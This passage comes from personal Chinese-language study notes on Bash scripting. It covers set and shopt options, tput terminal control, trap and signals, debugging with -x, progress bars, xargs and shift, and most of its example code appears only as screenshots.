Hash可以把任意长度的输入数据通过散列算法变换成固定长度的输出，输出值也叫散列值。Linux系统自带很多支持散列算法的工具，如md5sum、sha1sum、sha256sum、sha512sum等，通过这些工具也可以生成随机数据。需要注意的是，这种方式提取的随机数据都是十六进制数，也就是随机数据的范围是0-9A-F。

![image-20220323210254111](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323210254111.png)

后面多了空格和-  需要用cut -d' ' -f1去掉

![image-20220323210411845](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323210411845.png)

#### 5）使用进程号或进程数量生成随机数

有时候我们编写的脚本需要生成一些临时文件，而临时文件的文件名就可以使用一些随机数据以防止与其他文件名冲突，这时就可以考虑使用进程号、进程个数、文件行数或者文件个数之类的方式生成随机数。其中进程个数和文件个数发生伪随机冲突的可能性比较大，不太适合重复执行的脚本。对于需要重复执行的脚本，采用当前进程的进程号更合适。

![image-20220323211524043](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323211524043.png)

### 5.10 Shell解释器的属性与初始化命令行终端

Shell脚本需要在命令终端执行，而命令终端往往支持大量属性与功能，因此设置好Shell解释器及命令终端的属性，可以为脚本的执行提供最佳的环境。

首先来看看Shell解释器的属性设置与查看方法，目前CentOS操作系统默认使用的是Bash解释器，因此我们将主要学习Bash的内部命令set和shopt。通过这两个命令可以查看和设置Bash的很多特性。

使用set -o和shopt命令可以分别查看各自命令支持的所有属性及是否开启的标志。set命令可以通过选项开启或关闭特定的Bash属性，shopt命令可以通过-s和-u开启或关闭某些Bash属性。

![image-20220324181903467](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324181903467.png)

![image-20220324181925461](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324181925461.png)

常用set命令属性

![image-20220324181940599](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324181940599.png)

下面我们会对这些属性做逐一的案例演示和说明。

默认Bash定义的变量和函数都是局部的，进入子进程后这些变量和函数是无法再被调用和使用的，使用set -a可以让所有变量和函数默认就可以被子进程调用。

![image-20220324182437609](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324182437609.png)

allexport

默认Bash是支持花括号替换功能的，这样我们就可以使用简单的命令快速生成一个数据序列，比如字母序列表、数字序列表等。该功能可以使用braceexpand属性来开启或关闭。

![image-20220324182615500](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324182615500.png)

有时在脚本的开始位置设置一个set -e（errexit）是非常必要的。如果我们编写一个脚本，该脚本的主要功能是创建账户、设置账户密码，最后输出一条提示信息，而账户已经存在或有其他原因导致创建账户失败时，默认脚本依然会坚持执行完所有的脚本命令，很显然，这样会出现雪崩一样的错误提示。类似这样的脚本还有很多，向安装软件、修改配置文件、启动服务这些有关联性的脚本，都有可能因为前面的一个小小错误，而导致整个脚本大面积出错，设置set -e就可以在第一条命令出错时就将整个脚本停止运行。

![image-20220324183030946](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183030946.png)

hashall可以让Bash记录执行过的命令路径，并将其路径保存到一个内存的Hash表中，这样下次执行相同命令时就不需要再通过PATH变量查找该命令的路径，通常情况下这样可以提高效率。但有时，程序的路径发生了变化，因为有Hash记录的存在反而会导致命令执行失败。

![image-20220324183444888](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183444888.png)

![image-20220324183456682](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183456682.png)

![image-20220324183520569](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183520569.png)

可以看到，之前被执行过的外部命令都有具体的记录信息，hits代表命中次数，也就是系统通过读取Hash表就可以定位到命令路径的次数。

通常出现上述情况是没有问题的。但是，如果我们将ip命令从/usr/sbin/目录移动到/bin/目录，此时系统依然根据Hash表中记录的位置执行命令，就无法找到ip程序。我们可以使用hash -d删除某个记录信息，或者使用hash -r清空整个Hash表，再或者直接使用set +h禁用Hash表，这些方法都可以解决类似的问题。

![image-20220324183734846](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183734846.png)

![image-20220324183847122](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183847122.png)

![image-20220324183951741](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324183951741.png)

Bash可以通过设置histexpand属性支持使用感叹号调用历史命令，如！yum就可以直接调用历史命令中最后一个以yum开始的命令。

![image-20220324184757968](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324184757968.png)

![image-20220324184912932](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324184912932.png)

默认情况下，我们使用＞或者＞&等重定向符号时会覆盖文件，这有可能会导致现有的数据丢失，设置noclobber属性可以防止数据被覆盖。

![image-20220324212104960](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324212104960.png)

![image-20220324212152981](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324212152981.png)

如果我们写的脚本使用tar、rsync、mysqldump之类的工具对数据进行备份操作，因为备份需要一定的时间，可能会出现脚本被重复执行的情况，比如开启多个命令终端反复执行相同的某个脚本，或者多个远程连接的用户在执行同一个脚本，最后备份出来的文件也比较混乱。类似这样的脚本我们就可以利用Bash的noclobber属性来防止脚本被重复执行。

![image-20220324215128455](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324215128455.png)

如果脚本希望通过read或者位置变量读取用户的输入数值作为脚本的变量参数，而实际执行脚本又没有为脚本赋值，此时就会出现意外的错误。开启Bash的nounset属性可以有效防止变量未定义的这种错误。

![image-20220324215821795](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324215821795.png)

![image-20220324215928557](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324215928557.png)

上面这个脚本因为没有给$1和$2赋值，并且设置了set -u，所以提示变量为赋值后就直接退出了脚本。如果没有设置nounset属性，创建账户和修改密码的操作依然会被执行并且返回错误的结果。

shopt命令支持的常用属性及其功能

![image-20220324220829474](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324220829474.png)

前面已经介绍了Hash表的功能，正常情况下系统在执行命令时会先搜索Hash表中的记录，再根据表中的记录执行命令。但是根据Hash表中的记录如果无法找到命令就会报错。我们通过shopt开启checkhash属性后，如果系统根据Hash表中的记录无法找到命令，则继续进行正常的命令路径搜索。

![image-20220324221454091](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324221454091.png)

在开启checkhash根据Hash记录找不到程序时，可以继续采用其他方式搜索程序的路径，命令执行正常。

![image-20220324222022650](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324222022650.png)

cmdhist属性可以让我们将一条需要多行命令保存的历史记录到一条记录中。

![image-20220324225109875](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225109875.png)

![image-20220324225123344](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225123344.png)

除了使用set和shopt命令修改Bash属性，我们还可以使用tput命令查看或设置命令行终端的属性。

通过cols可以显示当前终端的列数，134列代表一行可以显示113个字符。

![image-20220324225326994](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225326994.png)

通过lines可以显示当前终端的行数。

![image-20220324225400229](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225400229.png)

通过clear可以将当前终端清屏，效果与执行clear命令或者按Ctrl+L组合键一样。

![image-20220324225430024](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225430024.png)

通过cup可以移动光标到特定的行与列。

![image-20220324225445929](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225445929.png)

![image-20220324225500640](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225500640.png)

通过sc可以将当前的光标位置保存，rc可以将光标还原至最后一次sc保存的位置。

![image-20220324225706070](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225706070.png)

![image-20220324225752547](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324225752547.png)

通过civis可以设置不显示光标，通过cvvis或者cnorm可以设置显示光标。

![image-20220324234242390](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324234242390.png)

![image-20220324234306762](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324234306766.png)

通过blink可以将终端设置为闪烁模式，bold可以将终端设置为加粗模式，rev可以将当前终端的字体色和背景色互换。

![1](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1.gif)

![image-20220324235208648](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324235208648.png)

![image-20220324235228988](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324235228988.png)

通过smcup可以保存当前屏幕，rmcup可以还原最近保存的屏幕状态。

![2](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C2.gif)

![3](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C3.gif)

通过tput sgr0可以取消所有终端属性，将终端还原为正常状态。

使用reset命令也可以将我们的当前终端重置为初始状态。

### 5.11 trap信号捕获

信号处理在Shell编程中非常重要，一般我们会使用信号进行进程间的通信工作。我们可以使用kill命令发送信号，然后使用trap命令捕获并处理信号。可能很多人对kill命令的理解就是杀死进程，但是kill除了可以杀死进程还可以做别的。kill本质上是在给进程发送特定的信号，这个信号可以是告诉进程终止运行、暂停运行、继续运行、切换日志等，而进程在收到这些信号后就会执行具体的动作。在Shell脚本中我们可以通过trap命令捕获传递过来的信号，并执行相应的动作命令。通常情况下，我们会把trap命令放置在脚本其他可执行的命令前面，但不是必须这么做。

![image-20220324235939532](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220324235939532.png)

这些信号可以使用数字（如9）、英文全称（如SIGKILL）或者英文简称（如KILL）表示，但是不同的系统环境对这些表示方式的支持是不一样的，这个具体使用时需要提前测试。通常推荐使用英文名称，这样兼容性会更好一些。

使用kill命令不指定信号时，默认信号为SIGTERM，该信号默认会终止进程。SIGINT信号等同于使用Ctrl+C组合键，默认会中断进程。SIGSTOP信号可以暂停一个进程，SIGCONT信号可以恢复暂停的进程继续运行。发送SIGTSTP信号等同于使用Ctrl+Z组合键，也可以通过CONT信号唤醒恢复进程。SIGKILL信号会强制杀死进程。

下面我们通过编写一个测试性的死循环脚本来验证这些信号。首先我们执行loop.sh脚本，然后另外开启一个命令终端查看loop.sh脚本的进程号，最后执行kill命令，通过给循环脚本发送不同的信号实现不同的功能。

![image-20220325000336262](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000336262.png)

![image-20220325000409060](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000409060.png)

因为前面的循环是永无止境的无限循环，当前命令终端暂时无法使用，我们需要重新开启一个新的命令终端。

![image-20220325000459093](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000459093.png)

查看进程号

![image-20220325000607461](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000607461.png)

![image-20220325000632425](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000632425.png)

传递暂停信号

回第一个命令终端会发现死循环脚本被暂停了。在第二个命令终端继续发送恢复信号让继续循环脚本，最后通过发送INT信号中断整个脚本的运行。

![image-20220325000657109](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000657109.png)

![image-20220325000704267](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000704267.png)

恢复

![image-20220325000722610](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000722610.png)

![image-20220325000732771](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000732771.png)

结束循环脚本

在Shell脚本中我们可以通过trap来捕获信号，并可以自定义需要执行的相应命令，其语法格式如下。

![image-20220325000809149](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325000809149.png)

如果命令为空则表示忽略信号，不执行任何命令。

最后再次修改loop.sh脚本，添加trap代码实现捕捉信号的功能。

![image-20220325001208826](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325001208826.png)

执行脚本后，我们使用组合键Ctrl+C或者Ctrl+Z都不会导致脚本中断或睡眠，反而是在屏幕上显示一条消息后睡眠3秒继续。我们还可以在启动一个命令中断执行kill -HUP ＜进程号＞，循环脚本也是返回一条信息后睡眠3秒继续。

![4](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C4.gif)

因为无法使用Ctrl+C组合键进行中断操作，所以我们需要查询进程ID后通过TERM信号杀死进程。

ps aux | grep -v grep | grep loop.sh

grep -v grep  表示除含有grep外的所有内容(因为我们使用grep的使用会产生包含grep的进程行  需要去除掉)

然后 在 ps aux 中使用它

然后再传入 grep loop.sh



实际要的就是 ps aux | grep loop.sh

![image-20220325001503102](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325001503102.png)

最后需要说明的是，在Shell脚本中并不能捕获所有信号，像TERM、KILL之类的信号是无法被捕获的。

### 5.12 实战案例：电子时钟

下面我们通过一个电子钟脚本，来演示tput和信号处理在脚本中的应用。我们将所有数字符号先保存到一个9行的数组中，每行使用一对引号表示数组的一个完整元素，对第一行的字符串截取0-11位，对第二行的字符串截取0-11位，依此类推，就可以把数字0完整地提取出来，其他数字采用相同的原理都可以单独提取出来。然后我们就可以通过tput定位光标后在屏幕上的任意位置打印数字了。

![image-20220325142438459](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325142438459.png)

![image-20220325142545805](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325142545805.png)

![image-20220325143014258](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325143014258.png)

对上面这个脚本还可以做适当的修改，将它变成一个倒计时程序。

![image-20220325143927717](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325143927717.png)

![image-20220325143938479](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325143938479.png)

![image-20220325143951425](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325143951425.png)

### 5.13 Shell小游戏之抓住小老鼠算你赢

下面我们再通过一个游戏的例子来展示设置终端属性与信号跟踪的应用。我们要完成一个如图5-1所示的小游戏，玩家需要使用键盘控制笑脸抓住随机出现的小老鼠。

![image-20220325144838702](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325144838702.png)

编写脚本时，首先需要先画一个游戏地图，笑脸和小老鼠都必须确保待在地图内部的位置上。定义函数draw_map实现地图的绘制，假设我们使用屏幕约1/4的区域绘制地图，就可以通过tput命令获取当前显示屏的宽度和高度，然后将获取的数字除以2。我们还要为游戏的边界进行留白，所以会从第二行第二列开始绘制地图，我们使用X代表横坐标，也就是列数，使用Y代表纵坐标，也就是行数。使用循环从上往下逐行打印#符号作为地图的边界，如果是顶部行或底部行就打印一排#符号，中间行则仅在最左侧和最右侧各打印一个#符号。

游戏开始后需要不停地更新小老鼠和笑脸的坐标，需要将地图中的内容清理为空白，然后显示新的笑脸和小老鼠。我们定义clear_screen函数实现清理游戏地图内的所有数据，我们需要清理的是左边界右侧至右边界左侧的所有内容，上边界下方至下边界上方的所有内容。假设从左到右有20个坐标位置，我们就使用space变量存储20个空格，这样再使用一个循环将所有

我们可以使用Unicode编码来实现绘制笑脸和小老鼠，Bash支持Unicode编码，我们需要的就是初始状态下笑脸显示在一个特定的位置，如（4,4）的屏幕位置，而小老鼠的位置需要为随机位置，通过tput定位然后显示特定的内容即可。

最后我们通过read命令读取用户的键盘输入内容，判断游戏结果，如果笑脸触碰到游戏边界则游戏结束，如果笑脸与小老鼠的位置重合则游戏结束，否则就控制笑脸进行特定位置的移动操作，通过修改笑脸的X和Y轴坐标即可实现这个功能。

![image-20220325153809223](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325153809223.png)

![image-20220325154227040](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325154227040.png)

![image-20220325154303224](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220325154303224.png)

![image-20220325154433457](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325154433457.png)





### 5.14 实战案例：脚本排错技巧

编写的Shell执行又出错了！不断出现新的Bug！一个脚本执行失败的原因可以分为语法错误和逻辑错误。语法错误比较容易排除，语法错误会导致Shell异常，系统会自动抛出异常报警信息，根据屏幕的提示信息我们就可以有针对性地进行分析并排除。比较难排除的往往是逻辑错误，执行脚本后没有提示语法错误，但是脚本执行的结果却不是我们需要的结果。甚至脚本执行结束后，因为屏幕没有报错，当我们以为脚本执行正确时，其实脚本已经出现了逻辑上的错误，这样的错误往往更加可怕、难以排查。下面我们会给出一些实用的排错小技巧，对于快速定位问题脚本会有非常大的帮助。

使用-x跟踪脚本执行过程，这是非常重要的一种排错方式。可以使用bash -x执行脚本，也可以通过为脚本中第一行解释器添加-x选项来实现相同功能的跟踪功能。如果输出结果以双加号开头（++）则表示命令是在子Shell中执行的。

![image-20220325175300203](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325175300203.png)

当然很容易看出user前面没有加$

对于这样的脚本我们就可以使用-x跟踪脚本执行过程，可以非常快速地发现问题所在！

![image-20220325175734342](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325175734342.png)

通过分析屏幕输出的信息，我们可以很清晰地看到整个脚本的执行流程，首先进行变量的定义赋值，其次通过for循环创建三个账户，但是在执行循环中的useradd命令时，变量替换后会发现i的值不对，我们需要让i调用的是user1、user2和user3的变量值，而实际执行时，变量i被直接替换为了user1、user2和user3，找到问题了，调用变量user1、user和user3时没有添加$符号！

修改为正确的脚本效果如下：

![image-20220325185232614](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\image-20220325185232614.png)

添加一些额外的辅助命令，也能帮助我们在排错的过程中定位错误原因。例如，增加额外的echo命令就是常见的做法，当我们不太确定错误时，可以在脚本中放置一个echo显示脚本的执行结果，辅助我们分析出现问题的原因。

![image-20220325185544231](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD%5Cimage-20220325185544231.png)

可以看出上面脚本的问题吗？对，进入循环后没有使用命令修改变量i的值，结果导致i始终为1，进而造成了一个无限死循环。像这样的脚本我们就可以通过在循环中添加echo来查看变量的值。

![image-20220325185617144](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325185617144.png)

最后一条排错小技巧是将脚本中的单个命令复制到命令行执行。有时候我们并不太确定脚本中的命令格式或逻辑是否正确，这时可以单独将某些命令复制到命令行执行一遍以检查错误，这种方法也是在工作中经常用到的排错方式。

### 5.15 实战案例：Shell版本的进度条功能

如果我们在编写一个需要执行很长时间的脚本，如复制大文件、源码编译安装软件包等，为这样的脚本设计一个进度条就是一个不错的方法，可以很好地提升脚本的使用体验。进度条也分很多种，可以是色块进度条，可以是数字百分比进度条，也可以是某种动态效果的进度条。

首先，我们做一个最简单的不控制数量的进度条，我们只需要在屏幕上不停地显示某种进度指示符号或色块即可，直到脚本的任务执行完成，再将进度条杀死（kill）。

![image-20220325191547746](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325191547746.png)

bar后面那个&用来放到后台

除了使用#符号作为进度条，还可以使用背景色块作为进度条。

![image-20220325193111003](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325193111003.png)

![image-20220325193153721](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325193153721.png)

但是，这样的进度条显示效果，在复制真正的大文件时，因为复制的时间比较长，最终可能满屏幕都是进度条，效果不好。我们可以利用转义字符\r将光标移至行首，但不换行

输出abc后，将光标调至行首后再输出12，字符串ab会被12覆盖，对c没有任何影响。

![image-20220325193840605](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325193840605.png)

输出abccdef后，将光标调至行首后再输出12和4个空格，字符串abcdef会被全部覆盖。

![image-20220325194159388](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325194159388.png)

为了能够方便地输出特定长度的空格，我们还需要使用printf命令，printf命令支持特定长度的数据输出，同时也支持转义符号的功能。

![image-20220325194459419](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325194459419.png)

abc后有5个空格

利用这种特性，我们就可以反复地在同一行输出进度条。需要注意的是，每次打印进度条都需要使用空格将前面一次的进度条覆盖。优化后的脚本如下。

![image-20220325195550535](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325195550535.png)

![image-20220325195558711](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325195558711.png)

下面我们再看一个动态显示指针的进度条效果，在屏幕上快速地逐个显示|、/、-和\这四个符号，并且每次在显示下一个字符前先删除前一个字符（使用\b实现Backspace退格键的效果），最终当刷新的速度足够快时就可以实现动态旋转指针的效果。

在编写完整脚本前，先通过命令行学习一些基础知识。printf命令支持%进行格式控制，%s、代表输出字符，实际数据有多少就输出多少字符。%10s可以指定输出宽度，当实际数据宽度不足10个宽度时系统自动补空格，而如果实际数据宽度大于10个宽度时，则按实际数据宽度显示字符。另外，也可以使用%.2s指定仅显示实际数据中的2个字符。

![image-20220325203605790](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325203605790.png)

![image-20220325203651637](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325203651637.png)

![image-20220325203820980](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325203820980.png)

![image-20220325203832487](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325203832487.png)

![image-20220325203838338](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325203838338.png)

printf命令还支持转义控制字符，使用\b可以删除光标前的一个字符，实现Backspace退格键的效果。

![image-20220325204003756](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325204003756.png)

另外，我们要想实现动态指针的效果，还可以定义一个变量，该变量存储的是四个指针符号，并且每循环一次就需要修改一次四个指针字符的位置。这可以通过掐头与去尾后重新给变量赋值来实现。

![image-20220325204750430](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325204750430.png)

![image-20220325205201799](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325205201799.png)

重新定义变量，将第一个任意字符移动到变量的最后位置，将最后三个任意字符移动到变量的开始位置。

![image-20220325205520521](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325205520521.png)

![image-20220325205601049](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325205601049.png)

有了上面这些基础知识的准备，下面我们来编写一个完整的动态指针的进度条脚本。

![image-20220325211229763](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325211229763.png)

最后，我们再看一个显示进度百分比的示例。可以通过对比源文件与目标文件的大小来判断复制的进度，或者通过源文件与目标文件的个数来判断进度。下面我们就以文件大小为例编写一个显示百分比进度的脚本。

![image-20220325213448600](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325213448600.png)

![image-20220325213517846](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325213517846.png)

![5](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD%5C5.gif)

### 5.16 再谈参数传递之xargs

在前面章节中我们介绍过使用管道可以将前一个命令的输出结果存入管道，然后后一个命令就可以从管道中读取数据作为输入。但是，实际情况是很多程序并不支持使用管道传递参数，比如find、cut这样的程序。

echo无法从管道中读出cut命令输出的结果，最终的输出结果为空。

![image-20220325214346924](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325214346924.png)

echo同样无法从管道中读取find命令的输出结果，最终的输出结果依然为空。

![image-20220325214512535](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325214512535.png)

另外，还有些程序仅可以从命令参数中读取输入的数据，无法从管道中读取数据。如果我们查看某个进程的进程号后，再通过管道将PID传递给kill命令以杀死该进程，这样的用法会导致程序直接出错。类似的问题在rm命令执行时也会出现错误

![image-20220325214713615](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325214713615.png)

遇到诸如此类的问题有没有好的办法可以解决呢？当然有了！xargs命令就可以读取标准输入或管道中的数据，并将这些数据传递给其他程序作为参数。不指定程序时xargs默认会将数据传递给echo命令。

![image-20220325214937034](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325214937034.png)

![image-20220325215033079](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325215033079.png)

![image-20220325215135053](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325215135053.png)

![image-20220325215314346](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325215314346.png)

![image-20220325215337831](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325215337831.png)

![image-20220325215404028](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325215404028.png)

默认xargs读取参数时以空格、Tab制表符或者回车符为分隔符和结束符，但是有些文件名本身可能就包含有空格，此时xargs会理解一个文件有多个参数。

![image-20220325220019876](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220019876.png)

![image-20220325220240125](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220240125.png)

对于这样的问题，find提供了一个print0选项，设置find在输出文件名后自动添加一个NULL来替代换行符，而xargs也提供了一个-0（数字零）选项，指定使用NULL而不是空格、Tab制表符或者换行符作为结束符。这样的话对于xargs来说空格就变成了一个普通字符，只有NULL才被识别为参数的结束符

![image-20220325220508329](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220508329.png)

xargs通过-a选项可以从文件中读取参数传递给其他程序。

![image-20220325220539587](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220539587.png)

xargs命令可以通过-n选项指定一次读取几个参数，默认读取所有参数。

![image-20220325220659119](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220659119.png)

xargs命令可以通过-d选项指定任意字符为分隔符，默认以空格、Tab制表符或换行符为分隔符。

![image-20220325220711434](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325220711434.png)

xargs命令可以使用-I选项指定一个替换字符串，xargs会用读取到的参数替换掉这个替换字符串。

![image-20220325221313503](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325221313503.png)

复制所有txt文件到/tmp/

![image-20220325221438743](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325221438743.png)

设置[]为替换字符串

![image-20220325221624026](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325221624026.png)

设置%为替换字符串

### 5.17 使用shift移动位置参数

在脚本中使用shift命令可以左移位置参数，shift命令后面需要一个非负整数作为参数，如果没有指定该参数，则默认为1。假设我们在执行一个脚本时输入了6个数，./test.sh a b c 12 3，那么在脚本中执行shift 4就可以让位置参数左移4位，原来的第5位变成了第1位的位置变量，也就是2变成的第一个位置参数，3变成了第二个位置参数。下面通过一个脚本演示shift的作用。

![image-20220325222131782](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325222131782.png)

通过shift命令我们可以很方便地读取所有位置参数，而不需要$1、$2、$3等这样很麻烦地逐个调用。我们看一个例子，下面这个脚本主要用来检测多个文件是否为空文件，如果是空文件则直接删除该文件。

![image-20220325223019677](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325223019677.png)

![image-20220325223218158](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325223218158.png)

### 5.18 实战案例：Nginx日志切割脚本

在实际生产环境中我们维护的网站每天都会有很大的访问量（Page View），有些网站每日PV量可以达到几十万级别，有些网站每日PV量可以达到百万级别，而像春运期间的12306单日访问量则高达几千亿次。目前多数企业选择Nginx作为Web服务器或Web代理服务器，Nignx默认会开启访问日志（access.log）和错误日志（error.log），这两个日志文件大小会随着时间的推移慢慢变大，如果我们不管它，则很快文件内容就会有上百万行，会占用上百兆的存储空间，后期打开文件和处理文件的速度也会变慢。因此我们需要在日志文件变成巨无霸之前就对其进行切割操作，对于已经很大的文件也需要使用合适的工具将其切割为多个小文件。

![image-20220325223806779](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325223806779.png)

